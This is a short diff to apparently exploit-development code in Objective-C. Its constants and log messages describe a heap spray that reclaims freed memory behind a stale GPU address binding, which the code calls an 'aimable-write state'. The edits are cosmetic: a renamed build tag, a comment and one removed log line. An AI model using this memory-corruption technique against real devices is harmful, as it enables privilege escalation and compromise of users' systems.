@@ -30,7 +30,7 @@
 #import <stdlib.h>
 #import <unistd.h>
 
-#define P137_BUILD  @"p137-latch-v2-backingfree"
+#define P137_BUILD  @"p137-latch-v3-cosmetic"
 #define P137_PAGE   0x4000
 #define P137_SPRAY  48
 
@@ -141,7 +141,7 @@ static void p137_bandit(const char *outcome) {
        our own process. The spray is the only target.                  */
     L(@"=== VERDICT: where did the 0xBB land? (v2: the backing is dead -");
     L(@"    only the spray can answer) ===");
-    uint32_t hitOld = 0, hitSpray = 0;
+    uint32_t hitOld = 0, hitSpray = 0;   /* v2: hitOld scan retired by law */
     for (uint32_t i = 0; i < ns; i++) {
         for (uint32_t j = 0; j < P137_PAGE; j++)
             if (((uint8_t *)spray[i])[j] == 0xBB) {
@@ -150,7 +150,6 @@ static void p137_bandit(const char *outcome) {
             }
     }
     /* (the v1 hitOld branch is retired in v2 - backing freed) */
-    L(@"   the unmap: the GPU executed through the stale GVA binding.");
     if (hitSpray) Lf(@"   RECLAIM-HIT in %u SPRAY PAGES = 0xBB over 0xCC = the"
                      @" stale record rode the reclaimed backing = THE AIMABLE-"
                      @" WRITE STATE (the write went where the allocator put us"
